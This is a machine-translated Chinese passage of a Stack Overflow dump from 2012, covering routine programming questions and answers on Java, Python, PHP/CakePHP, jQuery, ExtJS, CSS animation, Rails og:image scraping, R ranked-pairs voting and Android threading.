> 时间：2012-12-05T20:44:18.507

请参阅[http://codepen.io/morewry/pen/rJmCg](http://codepen.io/morewry/pen/rJmCg)。删除`display`、`width`和`height`并添加`right`和`bottom`。

```
a::after,
button::after {
    content:"";
    padding:6px;
    position:absolute;
    left:-6px; top:-6px; right: -6px; bottom: -6px;
    z-index:-1;
} 
```

技术如[http://nicolasgallagher.com/multiple-backgrounds-and-borders-with-css2/](http://nicolasgallagher.com/multiple-backgrounds-and-borders-with-css2/)

请注意，替换元素（包括大多数表单元素）、br、hr 和 img 不会与 ::before 和 ::after 配合使用。

# java - 排序数组列表 在爪哇

> ID：13530793
> 
> 赞同：0
> 
> 时间：2012-11-23T14:12:08.067
> 
> 标签：java, sorting, arraylist

我有这堂课：

```
public class Contact {
private  String firstname;
private String lastname;
private List<Integer> phoneNumber;
private Scanner in;
public Contact(){
    phoneNumber = new ArrayList<>();
    firstname = lastname = "";
    in = new Scanner(System.in);
}
public void setFirstName(){
    firstname = in.nextLine();
} 
public  void setLastName(){
    lastname = in.nextLine();
}
public void setPhoneNumber(){
    phoneNumber.add(in.nextInt());
}
public String getFirstName(){
    return firstname;
}
public  String getLastName(){
    return lastname;
}
public  Integer getPhoneNumber(int position){
    return phoneNumber.get(position);
}
} 
```

现在我想做一个有我的联系人的类电话簿..我想用

```
Arraylist<Contact> 
```

因为它没有固定大小。当我想按姓氏对这个数组列表进行排序时，我会怎么做？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-23T14:16:06.703

您的 Contact 类需要实现 Comparable 接口...然后您可以使用 Collections.sort(list) 对列表进行排序。

编辑：如果你想有多种排序方式，那么你也可以创建一个实现 Comparator 接口的类。您可以创建多个比较器（或使一个可配置），然后您可以将比较器作为第二个参数传递给 Collections.sort

这是一个解释比较器解决方案的链接：[http ://www.vogella.com/blog/2009/08/04/collections-sort-java/](http://www.vogella.com/blog/2009/08/04/collections-sort-java/)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-23T14:41:43.400

您必须在姓氏上放置一个自定义比较器，作为单独的类或匿名类：

好的，我正在编辑，因为我有一些空闲时间，我猜你正在学习 Java :)

将这两个方法添加到 Contact 类中进行测试：

```
public void setLastName(String lastname) {
    this.lastname = lastname;
}
@Override
public String toString() {
    return getLastName();
} 
```

测试：

```
public class Sort {

    static List<Contact> list = new ArrayList<Contact>();
    static Contact one = new Contact(); 
    static Contact two = new Contact(); 
    static Contact three = new Contact(); 
    public static void main(String[] args) {
        one.setLastName("Smith");
        two.setLastName("Monks");
        three.setLastName("Aaron");
        list.add(one); list.add(two); list.add(three);
        System.out.println("Before: " + list);
        Collections.sort(list, new Comparator<Contact>() {
            public int compare(Contact contact, Contact another) {
                return contact.getLastName().compareToIgnoreCase(another.getLastName());
            }
        });
        System.out.println("After: " + list);
    }
} 
```

你的结果应该是：

```
Before: [Smith, Monks, Aaron]
After: [Aaron, Monks, Smith] 
```

# python - Python：反转列表顺序

> ID：13530798
> 
> 赞同：11
> 
> 时间：2012-11-23T14:12:19.923
> 
> 标签：python, string, list, class, methods

> **可能重复：**
> [如何在 python 中反转列表？](https://stackoverflow.com/questions/3940128/how-can-i-reverse-a-list-in-python)

如何颠倒列表的顺序：例如。我有`lines.sort(key = itemgetter(2))`

那是一个排序列表。如果我想要这个列表完全按照它的顺序排列，但是顺序相反呢？

* * *

## 回答 #1

> 赞同：26
> 
> 时间：2012-11-23T14:13:19.403

```
lines.sort(key=itemgetter(2), reverse=True) 
```

或者如果您只想反转列表

```
lines.reverse() 
```

或者如果您想将列表复制到新的反向列表中

```
reversed(lines) 
```

* * *

## 回答 #2

> 赞同：22
> 
> 时间：2012-11-23T14:16:52.407

您是否要对列表进行排序（就地），使得最大的元素排在第一位，最小的元素排在最后（由您的`key`or`cmp`函数确定的最大和“最小”）？如果是这样，请使用其他答案。（如果要排序不合适，请`sorted`改用）。

*反转任何列表*的顺序（不合适）的一种简单方法是通过切片：

```
reverse_lst = lst[::-1] 
```

请注意，这也适用于其他[序列对象](http://docs.python.org/2/library/stdtypes.html#sequence-types-str-unicode-list-tuple-bytearray-buffer-xrange)（`tuple`并`str`立即想到）

# php - CakePHP 中的 join 究竟是如何工作的

> ID：13530799
> 
> 赞同：0
> 
> 时间：2012-11-23T14:12:23.337
> 
> 标签：php, cakephp

我想在我的控制器中有第二个包含数据的表，以便在视图中使用它。此时我有一个名为“PortfoliosController.php”的控制器。在这个控制器中，我有一个名为 Index 的公共函数，在这里我想加入它。

到目前为止，我有以下代码（只是我仍然无法访问连接表中的数据）：

```
public function index() {
    $this->Portfolio->recursive = -1;

    $options = $this->Portfolio->find('all', array('joins' => array(
        array(
            'table' => 'students',
            'alias' => 'Student',
            'type' => 'LEFT',
            'foreignKey' => true,
            'conditions'=> array('Student.userid = Portfolio.userid')
        )
    )));

    $this->set('portfolios', $this->Portfolio->find('all', $options));
} 
```

这里有没有人看到问题，或者有一个可能有帮助的答案！？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-23T14:22:12.180

从连接表中获取数据的最佳方法是在您的投资组合模型中的两个表之间建立关系。

所以在这种情况下，听起来像是使用了 hasmany 关系，因为投资组合可能包含第二个表中的许多结果？这意味着当您执行查找“全部”时，它不仅会找到该表中的所有数据，还会找到第二个表中的数据，因为它们之间的关系。

有关在此处设置关系的更多信息[http://book.cakephp.org/1.3/view/1040/Relationship-Types](http://book.cakephp.org/1.3/view/1040/Relationship-Types)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-12-28T10:57:10.640

你的模型

type'=>'left', 'conditions' => array('Class_master.class_id = Student_master.student_class'), 'dependent' => true ) ); } ?>

控制器：

$this->paginate = array('limit' => 25,'order' => array('admin_id' => 'asc'), 'conditions'=>array('school_admin_id'=>$this->Session- >read('Auth.User.school_admin_id')));

```
 $stlist = $this->paginate('Student_master');
                $this->set('stlist',$stlist);

                $this->set('students_data',$stlist); 
```

看法：

```
<tr>
    <th><input type="checkbox" name="checkall" id="checkall" onclick='checkedAll();'></th>
    <th>Name</th>
    <th>Email ID</th>
    <th>Contact No</th>
    <th>Class</th>
    <th>Status</th>
    <th>Option</th>
</tr>

<?php
    $rowcount=0;
    foreach ($students_data as $st_data) {
    $student_status=$st_data['Student_master']['student_status'];
  $student_id=$st_data['Student_master']['student_id'];
    $rowcount++;

    if($rowcount%2==0){
        $class='evenrow';
    }else{
        $class='oddrow';
    }

?>

<tr class='<?php echo $class;?>'>
<td>

<?php echo $this->Form->input("checkbox_std.", array("type" => "checkbox","value"=>$student_id));?>
</td>
    <td><?php echo $st_data['Student_master']['student_name'];?></td>
    <td><?php echo $st_data['Student_master']['student_email'];?></td>
    <td><?php echo $st_data['Student_master']['student_contact'];?></td>
    <td><?php echo $st_data['Class_master']['class_name'];?></td>

    <td>
        <?php 

            if($student_status==0){

        ?>
        <input type='button' value='Activate'>
        <?php }else{ ?>
        <input type='button' value='De-Activate'>
        <?php } ?>

    </td>
    <td>
        <input type='button' value='Edit'>
    <input type='button' value='View'>
    <input type='button' value='Delete'>

    </td>

</tr> 
```

# javascript - jquery ui datepicker 两个日期之间的范围

> ID：13530800
> 
> 赞同：0
> 
> 时间：2012-11-23T14:12:26.270
> 
> 标签：javascript, jquery

你能告诉我如何在 jquery ui datepicker 中启用范围，我想确定格式的范围：从 2012-12-10 到 2012-12-20 等（yy-mm-dd，已经指定）。所有其他日期不应该可用。

感谢我能得到的帮助，干杯！

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-11-23T14:19:27.000

尝试这个：

```
function setInterval(){
$(function() {
    $( "#startDate" ).datepicker({
        defaultDate: "+1w",
        onSelect: function( selectedDate ) {
            $( "#endDate" ).datepicker( "option", "minDate", selectedDate );
        }
    });
    $( "#endDate" ).datepicker({
        defaultDate: "+1w",
        onSelect: function( selectedDate ) {
            $( "#startDate" ).datepicker( "option", "maxDate", selectedDate );
        }
    });
});
} 
```

在哪里

```
startDate  
endDate 
```

是 datepicker 的两个输入字段

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-23T14:15:46.903

尝试类似：

```
jQuery("#date").datepicker({
    beforeShow: function() {
        return {
            dateFormat: 'yy-mm-dd',
            minDate: '2012-12-10',
            maxDate: '2012-12-20',
        }
    }
}); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-23T14:14:24.650

创建时使用`maxDate`和`minDate`选项。

[关联](http://jqueryui.com/datepicker/#min-max)

代码：

```
$( "#datepicker" ).datepicker({ minDate: value1, maxDate: value2 }); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-11-23T14:22:04.687

前面的答案是正确的，例如：

```
$(function() {
    $( "#datepicker" ).datepicker({ minDate: new Date(2012, 12, 10), maxDate: new Date(2012, 12, 20) });
}); 
```

我只是想添加以下您可能会觉得有用的链接：

[http://jqueryui.com/datepicker/#min-max](http://jqueryui.com/datepicker/#min-max)

[http://api.jqueryui.com/datepicker/](http://api.jqueryui.com/datepicker/)

# objective-c - Cocos2D。iPad 在 iOS 6 上加载视网膜图形

> ID：13530801
> 
> 赞同：0
> 
> 时间：2012-11-23T14:12:31.003
> 
> 标签：objective-c, ipad, cocos2d-iphone, ios6, retina-display

问题很简单。在 iOS 6 上运行时，iPad 正在加载带有后缀的资源，`~ipad-hd`而不仅仅是`~ipad`. 你有没有遇到过这个问题？我如何解决它？

# insert-update - 如何在进入采购和销售时进行自动库存更新

> ID：13530806
> 
> 赞同：1
> 
> 时间：2012-11-23T14:12:40.860
> 
> 标签：insert-update, stock, auto-update

好吧，我正在使用`Access`包含五个表的数据库，即。`Vendors, PurOrder, Customers, SalesOrder, Stock.`

```
Vendors: VendorID(PK), Name, Contact, Phone, Address.

PurOrder: POID(PK), Items, Quantity, Rate, Total

Customers: CustID(PK), Name, Phone, Address

SalesOrder: SOID(PK), Items, Quantity, Rate, Total

Stock: SItemID(PK), Items, Quantity, Rate, Total 
```

我在`VB.NET Express`. 我不需要为此编写代码。我单击数据源 > 添加数据库 > 将其拖到我的采购和销售表单中，它会自动创建添加、删除和保存以及导航按钮作为工具条。此外，我将采购订单表（例如）拖到 Datagrid 模式下的表单中，就是这样！现在，我可以将记录保存、删除和添加到我的数据库作为购买。

好吧，我可以输入和保存/更新采购和销售凭证，并检索客户/供应商 ID 报告并打印出来。

我唯一的问题是我不知道要在购买或销售时自动更新袜子数量该怎么做。

提前致谢。

# javascript - Ext.tip.Tooltip 组合框失去焦点

> ID：13530808
> 
> 赞同：0
> 
> 时间：2012-11-23T14:12:47.080
> 
> 标签：javascript, extjs, extjs4

我已经配置了一个带有组合框的丰富工具提示。当我通过单击打开组合框时，工具提示失去焦点并关闭。当我在工具提示之外而不是在工具提示内单击时，需要此行为。

在工具提示本身内部失去焦点时，如何防止关闭工具提示？

片段：

```
var tip = Ext.create('Ext.tip.ToolTip', {
    autoHide: false,
    items: [{
        xtype: 'combobox',
        ...
    }]
});

Ext.QuickTips.init();
tip.show(); 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-23T15:39:32.063

当您想保持提示可见时，您可以监听`beforehide`事件并返回 false，但无法访问 mouseevent。

另一种解决方案（IMO 更容易）是覆盖`onDocMouseDown`. `Ext.tip.ToolTip`例子：

```
onDocMouseDown: function(e) {
    var combo = this.down('combo');

    if (!e.within(combo.getPicker().el)) {
        //this.callParent(arguments); 
        Ext.tip.ToolTip.prototype.onDocMouseDown.call(this, e);
    }
} 
```

工作样本：http: [//jsfiddle.net/7NWr5/8/](http://jsfiddle.net/7NWr5/8/)

# javascript - 获取图像信息的最佳实践

> ID：13530811
> 
> 赞同：1
> 
> 时间：2012-11-23T14:12:50.270
> 
> 标签：javascript, jquery, html, image, cross-browser

我尝试使用 JQuery 广告将图像加载到 HTML 元素中，并使用图像属性来做其他事情。我试图做的是这样的：

```
var img = new Image();
img.src = "icon.png";
var width = img.width;
var height = img.height;
$("#element").css("background-image", "url(" + img.src + ")");
//use width and height... 
```

它在大多数情况下都有效，但我发现有时“宽度”和“高度”设置为 0。进行一些搜索时，我发现图像加载是一项异步工作，所以碰巧我尝试读取属性时它是仍然没有加载。我发现有一个 onLoad 事件可用于在加载图像时指定回调函数。

我想知道这是否是做这些事情的最好方法。例如，假设我只需要有关图像的一些信息，但不需要显示它，并且我想管理该信息客户端。我需要加载图像吗？是否有其他方法可以获取此类信息？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-11-23T14:13:50.787

您必须等待加载图像：

```
var img = new Image();
img.onload = function() {
  var width = img.width;
  var height = img.height;
  $("#element").css("background-image", "url(" + img.src + ")");
};
img.src = "icon.png"; 
```

因为必须从分配给“src”属性的 URL 中获取图像，所以该操作被异步处理。也就是说，您不能保证图像将可用于分配“src”属性后的语句。

它有时会起作用，因为您的图像可能被缓存。

# javascript - 更改或生成然后删除 css3 关键帧

> ID：13530825
> 
> 赞同：1
> 
> 时间：2012-11-23T14:13:28.763
> 
> 标签：javascript, css, animation, webkit

我目前正在使用 sencha 进行一个项目。在这个项目中，我有一个旋转的“wheeloffortune”轮子，它会旋转到轮子的某个部分来获得你的奖金。

我之前用一些 javascript 做过这个，我创建了间隔来切换 div 的 css 类，但效果不佳。

我现在想用 css3 动画来做，我有以下 css：

```
 @-webkit-keyframes rotater {
    from {
        -webkit-transform: rotate(0deg);
    }
    to {
        -webkit-transform: rotate(3600deg);
    }
}

.css3-rotaterFull {
    -webkit-animation-name: rotater;
    -webkit-animation-iteration-count: 1;
    -webkit-animation-timing-function:ease-out;
    -webkit-animation-duration: 15s;
} 
```

但我需要将它旋转到某个可变的角度。因此我需要能够设置

```
to {
    -webkit-transform: rotate(3600deg);
} 
```

在我将类添加到 div 之前，部分到可变的度数

关于如何做到这一点的任何想法？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-23T18:55:28.693

使用 CSSOM：[http ://dev.w3.org/csswg/cssom/](http://dev.w3.org/csswg/cssom/)

```
function rotate(deg) {
    var elem = document.getElementById('wheel');
    var lastStyleSheet = document.styleSheets[document.styleSheets.length - 1];
    var rule = '@-webkit-keyframes menuBreadcrumbAnimation {\
            0%  {\
                -webkit-transform: rotate(0deg);\
            } 100% {\
                -webkit-transform: rotate(' + deg + 'deg);\
            }';

    function rotateAnimationEnd() {
        lastStyleSheet.removeRule(lastStyleSheet.length);
        elem.removeEventListener('webkitAnimationEnd', rotateAnimationEnd,  false);
    };

    lastStyleSheet.insertRule(rule, lastStyleSheet.rules.length);
    elem.addEventListener('webkitAnimationEnd', rotateAnimationEnd, false);
    elem.classList.add('css3-rotaterFull');
}; 
```

一旦你知道结束度数是什么，就将它传递给这个函数。它将抓取文档中的最后一个样式表，创建一个插入动态度的规则，然后将规则插入到样式表中，并将适当的类添加到您的元素中，以便它使用动画。

webkitAnimationEnd 侦听器会在动画完成后从样式表中删除规则，这样规则就不会持续建立，并且还会删除 webkitAnimationEnd 侦听器本身，因此它不会干扰下一次旋转。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-09-20T03:26:53.560

将其放在样式标签中，以便能够使用`getElementById('').innerHTML;`.

# ruby-on-rails - 如何显示 og:image 给定页面的 url

> ID：13530826
> 
> 赞同：2
> 
> 时间：2012-11-23T14:13:28.720
> 
> 标签：ruby-on-rails, facebook

我有一个购物推荐网站，它允许用户发布他们推荐的商品的网址。

该表单目前只包含一个输入到主产品页面的 url。

如果用户要发布如下链接：

[http://www.homedepot.com/webapp/wcs/stores/servlet/ProductDisplay?productId=203533553&storeId=10051&langId=-1&catalogId=10053&cm_sp=BlackFriday-_-11_23-_-Hero_C-_-349_Each_GE_Washer_Dryer_Special_Buy#.UK-DHuOe_VQ](http://www.homedepot.com/webapp/wcs/stores/servlet/ProductDisplay?productId=203533553&storeId=10051&langId=-1&catalogId=10053&cm_sp=BlackFriday-_-11_23-_-Hero_C-_-349_Each_GE_Washer_Dryer_Special_Buy#.UK-DHuOe_VQ)

我想显示这个 url 中包含的 og:image 的图像标签。

使用 facebook 开放图形协议页面，我看到上面的示例 url 确实有一个 og:image

[http://developers.facebook.com/tools/debug/og/object?q=http%3A%2F%2Fwww.homedepot.com%2Fwebapp%2Fwcs%2Fstores%2Fservlet%2FProductDisplay%3FproductId%3D203533553%26storeId%3D10051% 26langId%3D-1%26catalogId%3D10053%26cm_sp%3DBlackFriday-_-11_23-_-Hero_C-_-349_Each_GE_Washer_Dryer_Special_Buy%23.UK-DHuOe_VQ](http://developers.facebook.com/tools/debug/og/object?q=http%3A%2F%2Fwww.homedepot.com%2Fwebapp%2Fwcs%2Fstores%2Fservlet%2FProductDisplay%3FproductId%3D203533553%26storeId%3D10051%26langId%3D-1%26catalogId%3D10053%26cm_sp%3DBlackFriday-_-11_23-_-Hero_C-_-349_Each_GE_Washer_Dryer_Special_Buy%23.UK-DHuOe_VQ)

如何将 url 提取到 og:image？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-11-26T23:15:07.167

I ended up using [Nokogiri](http://nokogiri.org/) like below, while relying heavy on this tutorial by [Railscasts](http://railscasts.com/episodes/190-screen-scraping-with-nokogiri).

```
def photo_from_url(url)
  if !Nokogiri::HTML(open(url)).css("meta[property='og:image']").blank?
    photo_url = Nokogiri::HTML(open(url)).css("meta[property='og:image']").first.attributes["content"]
    self.photo = URI.parse(photo_url)
    self.save
  end
end 
```

I found this to be more reliable than the [opengraph gem](https://github.com/intridea/opengraph):

```
url_with_photo = opengraph.fetch(url)
url_with_photo.image 
```

as this second method sometimes doesn't work, even on pages that have an og:image tag in the source code. (I didn't implement it completely wrong, as it did work on some pages...).

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-27T02:00:50.423

如果您知道页面的 ID，则可以将 /picture 附加到 Graph API URL 的末尾，以重定向到与其关联的图像，无论是显式还是隐式。

例如，下面的一位评论者提到了 ID 10150708135007395 (http://www.devils-heaven.com/heroku-gratis-ssl-fur-facebook-apps/)，所以要获取缩略图，只需抓取：

```
https://graph.facebook.com/10150708135007395/picture 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-23T14:27:03.670

您的网页没有任何 Open Graph 标签。有关说明和示例，请参见此处：http: [//ogp.me/](http://ogp.me/)

当用户分享链接时，Facebook 会读取这些标签。

调试器告诉你怎么做顺便说一句：

> 推断属性：应显式提供“og:url”属性，即使可以从其他标签推断出值。
> 
> 推断属性：应显式提供“og:title”属性，即使可以从其他标签推断出值。
> 
> 推断属性：应显式提供“og:description”属性，即使可以从其他标签推断出值。
> 
> 推断属性：应显式提供“og:image”属性，即使可以从其他标签推断出值。

但即使没有（非常重要和有用的）标签，我也可以在 facebook 上分享您的链接，并且效果很好。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2017-08-16T17:09:20.900

```
module MetaParser

  require 'open-uri'

  COMMON_USER_AGENTS = ['Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36']  

  def self.parse_doc(url)
    Nokogiri::HTML.parse(open(url,'User-Agent' => COMMON_USER_AGENTS.sample ))  
  end   

  module Facebook
    def self.get_attributes(url)
      attributes = {}
      doc = MetaParser.parse_doc(url)

      attributes[:url]   = url
      attributes[:site_name] = doc.at('meta[property="og:site_name"]')['content']
      attributes[:title] = doc.at('meta[property="og:title"]')['content'] 
      attributes[:description] = doc.at('meta[property="og:description"]')['content']
      attributes[:image] = doc.at('meta[property="og:image"]')['content']

      return attributes
    end
  end # Facebook  

  module Twitter
    def self.get_attributes(url)
      attributes = {}
      doc = MetaParser.parse_doc(url)

      attributes[:url]   = url
      attributes[:site_name] = doc.at('meta[name="twitter:site"]')['content']
      attributes[:title] = doc.at('meta[name="twitter:title"]')['content'] 
      attributes[:description] = doc.at('meta[name="twitter:description"]')['content']
      attributes[:image] = doc.at('meta[name="twitter:image"]')['content']

      return attributes
    end  
  end # Twitter     

end 
```

用法：

MetaParser::Facebook.get_attributes("google.com") MetaParser::Twitter.get_attributes("google.com")

# r - 投票/排名 Ranked Pair 方法

> ID：13530827
> 
> 赞同：6
> 
> 时间：2012-11-23T14:13:33.273
> 
> 标签：r, implementation, ranking, voting-system

目前，我尝试了解[Ranked Pairs](http://en.wikipedia.org/wiki/Ranked_pairs)方法。从 Wikipedia 条目中，我并没有真正了解如何创建成对比较矩阵。这个[解释](http://eblong.com/zarf/rpvote.html)帮助我理解了比较这些对的一种方法——不过，我不确定这是否正是 wiki 中所说的。我的第一个问题是，根据[1比较](http://en.wikipedia.org/wiki/Ranked_pairs)[2](http://eblong.com/zarf/rpvote.html)中的对是否有效？

我设法将[2](http://eblong.com/zarf/rpvote.html)中的解释改编为 R 代码：

在以下（不切实际）示例中，候选人（行）多于选民（列），但所有选民都给每个候选人一个排名（完整排名）

```
# some random example
random.example <- matrix(rnorm(50), ncol = 5, 
                         dimnames = list(candidates = paste("c", 1:10, sep=""), 
                                         voters = paste("v", 1:5, sep="")))
rmat <- apply(random.example, MARGIN = 2, rank, ties.method = "f") 
```

然后使用 Ranked Pairs 方法对秩矩阵进行排名

```
pm <- apply(rmat , MARGIN=1, function(x) {
  return(apply(rmat , MARGIN=1, function(y) {
    return(sum(x > y) - sum(x < y))
  }))
})

sorted <- apply(pm , MARGIN=1, function(x, numberOfVoters) {
  return(c(like    = sum(x > 0), 
           dislike = numberOfVoters - sum(x < 0), 
           ties    = numberOfVoters - (sum(x == 0) - 1))) 
}, numberOfVoters = ncol(rmat))) 
```

评论`sorted`：如果我理解正确，那么我们需要先按，`like`然后`dislike`按 ，然后按`ties`。我重新分配了`dislike`和`ties`( `numberOfVoters`) 的值，以便可以将其用作“数字”。这引出了我的下一个问题：排序和确定获胜者。我想，但我不确定，在哪里可以按 |candidates| 的基数排序：

```
scores <- apply(sorted  * (ncol(sorted) ^ c(2,1,0)), MARGIN=2, sum) 
```

所以排名`scores`（越高越好）给了我们一个排名。正确的？

第三个问题是关于确定候选人排名的交互作用。分数排名为我们提供了候选人的排名列表。但是 Wikipedia [1](http://en.wikipedia.org/wiki/Ranked_pairs)告诉我们，对于真正的排名，应该通过从列表中删除获胜者来重新计算整个过程以确定下一个获胜者。而且我不明白为什么这可能会返回不同的排名。有人举个简单的例子吗？

非常感谢！

# java - 在java中从USB设备向pdf添加数字签名

> ID：13530830
> 
> 赞同：2
> 
> 时间：2012-11-23T14:13:46.603
> 
> 标签：java, pdf, digital-signature

实际上，我对 java 安全性了解不多。我的要求是从客户端机器上的 USB 设备向 pdf 添加数字签名，如果您处理过此类问题，请协助我提供链接，

谢谢，

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-24T09:22:35.360

我写了一份关于数字签名和 PDF 的白皮书。它还解释了这种 USB 令牌的含义。您可以从以下 URL 免费下载此文档：http: [//itextpdf.com/book/digitalsignatures](http://itextpdf.com/book/digitalsignatures)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-23T14:39:45.087

您的意思是在服务器上有 Java 代码并且需要在客户端对文档进行签名吗？这样的任务需要有客户端机制（通常是 Java 小程序或 ActiveX 控件或一些独立的应用程序）来完成实际的签名工作。

我们的 SecureBlackbox 库有一个分布式密码学插件，可让您轻松完成任务。您将[在我们的网站](http://www.eldos.com/sbb/desc-dc.php)或[此 SO 答案](https://stackoverflow.com/a/10656679/47961)中找到附加组件的详细说明。

如果您需要在客户端 Java 代码中对数据进行签名（即 USB 设备是代码的本地设备），那么您可以使用我们 SecureBlackbox 产品的 PDFBlackbox 包 - 它支持使用 USB 令牌和加密卡进行操作。

# php - 从 PHP 源获取数组键和值

> ID：13530834
> 
> 赞同：0
> 
> 时间：2012-11-23T14:13:57.833
> 
> 标签：php, regex, arrays

我正在写一个配置编辑器。我正在使用 fopen 和 fgets 逐行读取文件。我想从字符串中获取数组键和值。我不熟悉正则表达式，这就是我问的原因。

示例配置文件：

```
$conf['something'] = 'value';
$conf['other_thing']['another_key'] = 3000; 
```

我无法遍历 $conf 数组，因为它是系统中的 SuperObject，并且包含许多其他数据，甚至是初始化的类...

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-23T14:24:23.130

我会这样做：

```
// get config file as a variable
require_once('config_file.php');

// get keys
$keys = array_keys($conf);

// get config file as a variable
$values = array_values($conf); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-23T14:24:27.997

虽然不是直接回答您的问题，但正如您所写*的“我正在编写配置编辑器”。*那么我假设你也写下这个配置文件。因此，假设您的编辑器在`$conf`工作时将配置保存在数组中，我会将其转储为 JSON 而不是您的 PHP 代码：

```
file_put_contents('config.json', json_encode($conf)); 
```

然后在需要时读回

```
$conf = json_decode( file_get_contents('config.json') ); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-23T14:20:42.243

`\$conf\['(.*?)']\s+=\s+'(.*?)';`这是你的模式。键在组 1 中，值在组 2 中。

`$`,`[`并且`]`是特殊字符，因此您应该转义它们。`\s+`表示空白字符 1 次或多次。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-11-23T14:23:34.143

这是您的正则表达式：

```
\$conf(\[('.*')\])+\s?=\s?(.*); 
```

第一个匹配是你的键，最后一个是你的值

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-11-23T14:29:45.173

由于这是 php 数组，您可以直接循环遍历它，并获取所需的键值对，否则您可以使用 php 的函数[array_keys](http://php.net/manual/en/function.array-keys.php)从 $conf 数组中获取所有键，使用[array_values](http://php.net/manual/en/function.array-values.php)获取数组值

要不然

如果您想创建配置编辑器，请尝试使用 ini 文件 php 对创建和使用配置文件有很好的支持，请参阅此函数[parse_ini_file](http://php.net/manual/en/function.parse-ini-file.php)如果您有太多键值对，这是创建配置文件的标准方法

# php - 网站管理员通过什么方式进入控制面板？

> ID：13530839
> 
> 赞同：2
> 
> 时间：2012-11-23T14:14:10.163
> 
> 标签：php, web, admin

我有一个用 PHP、MySQL 和其他东西制作的网站。我在我的网站中使用 url 重写，因此管理员需要去那里`http://{website}.com/admin/`输入他/她的用户名和密码才能进入控制面板，在那里他/她更新大部分网站，包括语言文件等。

现在我想知道我应该以什么方式让这个网站管理员访问`http://{website}.com/admin`。

他们真的应该去那个链接吗？`/admin`? 因为我听说这不是最推荐的方式，我认为今天的大多数网站都以不同的方式做到这一点？一些特别创建的桌面应用程序？其他？

请让我知道最推荐的方法是什么。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-23T14:18:24.183

不推荐，因为它最明显。尽管如此，如果您的安全性在那里，那么它将是什么 URL 是无关紧要的。通过不使用`/admin`（而是使用 ie `/a32mTT`），您可以过滤掉一些自动尝试，但仅此而已。我根本不会考虑这种“安全性”。另一方面，您的用户/管理员可能会发现记忆有问题`/a32mTT`，而不是`/admin`. 最后，如果您的安全性很糟糕，那么一旦您的 URL 泄露，您可能很快就会被淘汰，所以首先要关注真正的安全性 :)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-23T14:32:08.780

主要使用您希望以管理员身份访问该站点的方式，cms 即内容管理站点是最好的示例，但是正如您所提到的，您使用的是 Php，mysql，所以我建议您使用类似的框架yii，joomla，wordpress 等，它可以帮助管理员从远程位置管理站点以及[http://www.foo.com/admin.php](http://www.foo.com/admin.php)。或者类似的，我推荐你 yii，wordpress 都是开源的，即免费的，对于 yii，你必须知道 MVC，即模型视图控制器。只需 google yii 或 wordpress 去他们的网站下载文件。如果使用 Wamp，请在 htdocs 文件夹中提取 Zip 格式的文件，有关更多教程，请使用他们的论坛或互联网上提供的各种教程。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-23T14:25:41.310

这是个大问题。可能为了安全增强，最好使用管理员以外的东西。我知道一些使用像 cms.website.com 这样的子域。但是，如果您真的担心安全性，那还不够。

# android - 当我尝试设置 ImageView 时出现线程睡眠错误

> ID：13530849
> 
> 赞同：0
> 
> 时间：2012-11-23T14:14:56.543
> 
> 标签：android

运行此代码时出现错误，每次我在睡眠方法上设置时间时都会出现错误并关闭应用程序。

```
im = (ImageView) findViewById(R.id.imag1);

    Thread t = new Thread() {
        public void run() {
            try {
                sleep(5000);

            } catch (InterruptedException e) {
                e.printStackTrace();
            } finally {

                im.setImageResource(R.drawable.primeiro_misterio_gozoso07);
            }
        }
    };
    t.start(); 
```

我该如何解决？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-23T14:18:27.183

您无法从非 ui 线程访问 ui，您可以使用处理程序完成相同的操作。

```
new Handler().postDelayed(new Runnable(){
        @Override
        public void run() {
            im.setImageResource(R.drawable.primeiro_misterio_gozoso07);
        }
    }, 5000); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-23T14:20:12.817

您无法从后台线程访问 UI。你只能通过 MainThread 来做。一种解决方法是

```
// SLEEP 5 SECONDS HERE ...
    Handler handler = new Handler(); 
    handler.postDelayed(new Runnable() { 
         public void run() { 
              // do your work here
         } 
    }, 5000); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-23T14:17:46.700

唯一可以触摸或修改他的视图的线程是 UI 线程（MainThread），而不是你可以使用`CountDownTimer`这样的：

```
CountDownTimer timer = new CountDownTimer(1000,5000) 
 {
      @Override
       public void onTick(long l){}

       @Override
       public void onFinish(){
          im.setImageResource(R.drawable.primeiro_misterio_gozoso07);
       };
 }.start(); 
```

